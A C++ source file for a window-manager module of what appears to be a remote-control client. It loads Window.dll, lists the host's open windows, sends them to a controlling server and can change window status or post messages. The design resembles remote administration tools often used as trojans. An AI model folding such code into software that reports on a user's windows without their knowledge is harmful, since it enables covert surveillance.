#include "ClientWindowManager.h"



CClientWindowManager::CClientWindowManager(CIOCPClient* ClientObject):CManager(ClientObject)
{
	
	printf("窗口构造函数\r\n");
	m_WindowModuleBase = LoadLibrary("Window.dll");
	
	if (m_WindowModuleBase==NULL)
	{
		ShowErrorMessage("CClientWindowManager","m_WindowModuleBase==NULL");
	}
	
	m_GetWindowList   = (f2)GetProcAddress(m_WindowModuleBase, "GetWindowList");
	m_SetWindowStatus = (f3)GetProcAddress(m_WindowModuleBase, "SetWindowStatus");
	m_PostWindowMessage = (f3)GetProcAddress(m_WindowModuleBase, "PostWindowMessage");

	if (m_GetWindowList == NULL||m_SetWindowStatus == NULL||m_PostWindowMessage==NULL)
	{
		ShowErrorMessage("CClientWindowManager","导出函数==NULL");

		return;
	}

	SendClientWindowList();
}


CClientWindowManager::~CClientWindowManager()
{
	printf("窗口析构函数\r\n");
}


void CClientWindowManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_WINDOW_REFRESH_REQUIRE:
	{
		SendClientWindowList();
		break;
	}

	default:
		break;
	}
}

//窗口
BOOL CClientWindowManager::SendClientWindowList()
{	
	ULONG BufferLength = 0;
	char* v1 = NULL;
	BOOL  IsOk = FALSE;
	char* BufferData = NULL;
	if (m_GetWindowList == NULL)
	{
		return IsOk;
	}
	v1 = m_GetWindowList(BufferLength);
	if (v1 == NULL)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, BufferLength+1);
	if (BufferData==NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;
	memcpy(BufferData+1, v1, BufferLength);
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (v1 != NULL)
	{
		LocalFree(v1);
		v1 = NULL;
	}	
	if (BufferData!=NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	
	return IsOk;
}


